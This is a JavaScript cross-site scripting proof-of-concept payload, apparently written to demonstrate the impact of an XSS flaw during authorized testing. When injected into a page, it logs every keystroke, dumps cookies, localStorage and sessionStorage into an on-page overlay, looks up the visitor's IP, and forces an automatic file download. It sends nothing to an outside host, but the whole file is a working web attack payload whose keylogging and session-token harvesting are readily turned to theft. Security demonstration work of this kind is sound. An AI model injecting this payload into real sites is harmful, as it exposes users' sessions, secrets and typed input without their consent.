(function() {
    const dashboard = document.createElement('div');
    dashboard.id = 'xss-poc-dashboard';

    Object.assign(dashboard.style, {
        position: 'fixed',
        top: '10px',
        right: '10px',
        width: '400px',
        backgroundColor: 'white',
        border: '2px solid red',
        zIndex: '99999',
        padding: '15px',
        fontFamily: 'sans-serif',
        maxHeight: '80vh',
        overflowY: 'auto',
        boxShadow: '0 0 10px rgba(0,0,0,0.5)',
        color: 'black',
        textAlign: 'left'
    });

    dashboard.innerHTML = `
        <h3 style="color:red; margin-top:0;">⚠️ XSS Impact Demonstration</h3>
        <p style="font-size: 12px;">This demonstrates what an attacker can execute via XSS without user consent.</p>
        <hr>
        <p><strong>Your IP:</strong> <span id="ipinfo">Loading...</span></p>
        <p><strong>Date:</strong> <span id="today"></span></p>
        <p><strong>Origin:</strong> <span id="poc-origin"></span></p>
        
        <h4>Live Keystroke Capture:</h4>
        <div id="poc-keys" style="background:#eee; padding:5px; min-height:20px; word-break:break-all; font-family:monospace; border:1px solid #ccc;"></div>

        <hr>
        <h4>Browser Storage Access:</h4>
        <h5>Cookies</h5>
        <table id="poc-cookies" border="1" style="width:100%; border-collapse:collapse; font-size:11px;"></table>
        <h5>Local Storage</h5>
        <table id="poc-local" border="1" style="width:100%; border-collapse:collapse; font-size:11px;"></table>
        <h5>Session Storage</h5>
        <table id="poc-session" border="1" style="width:100%; border-collapse:collapse; font-size:11px;"></table>
        
        <button onclick="this.parentElement.remove()" style="margin-top:10px;">Close Overlay</button>
    `;

    document.body.appendChild(dashboard);

    const todayStr = new Date().toISOString().split('T')[0];
    document.getElementById('today').innerText = todayStr;
    document.getElementById('poc-origin').innerText = window.location.origin;

    // Keylogger
    const keyLogDir = document.getElementById('poc-keys');
    document.addEventListener('keydown', function (e) {
        keyLogDir.innerText += e.key;
    });

    // IP Discovery (Cloudflare)
    fetch('https://1.1.1.1/cdn-cgi/trace')
        .then(response => response.text())
        .then(data => {
            const lines = data.trim().split('\n');
            const info = {};
            lines.forEach(line => {
                const [key, value] = line.split('=');
                info[key] = value;
            });
            document.getElementById('ipinfo').textContent = info.ip || 'unknown';
        })
        .catch(() => {
            document.getElementById('ipinfo').textContent = 'Blocked/Unknown';
        });

    // Storage Dumping Function
    function populateTable(storageObj, tableId) {
        const table = document.getElementById(tableId);
        table.innerHTML = '<tr><th style="text-align:left">Key</th><th style="text-align:left">Value</th></tr>';

        const keys = Object.keys(storageObj);
        if (keys.length === 0) {
            table.innerHTML += '<tr><td colspan="2" style="text-align:center;">Empty</td></tr>';
            return;
        }

        keys.forEach(key => {
            const val = storageObj[key];
            const row = table.insertRow();
            row.insertCell(0).innerText = key;
            row.insertCell(1).innerText = val;
        });
    }

    // Process Cookies
    const cookies = document.cookie.split(';').reduce((acc, cookie) => {
        const parts = cookie.split('=');
        const key = parts.shift().trim();
        const value = parts.join('=').trim();
        if (key) acc[key] = value;
        return acc;
    }, {});

    populateTable(cookies, 'poc-cookies');
    populateTable(localStorage, 'poc-local');
    populateTable(sessionStorage, 'poc-session');

    // 3. Drive-by Download Simulation
    function triggerDownload(filename, text) {
        const element = document.createElement('a');
        element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(text));
        element.setAttribute('download', filename);
        element.style.display = 'none';
        document.body.appendChild(element);
        element.click();
        document.body.removeChild(element);
    }

    const downloadContent = `--- AUTHORIZED SECURITY TEST ---
Date: ${todayStr}
Type: Drive-By Download Demonstration
Origin: ${window.location.origin}
Impact: This file downloaded automatically. In a real attack, this could be malware.`;

    setTimeout(() => {
        triggerDownload('Security_Test_File.txt', downloadContent);
    }, 2000);

})();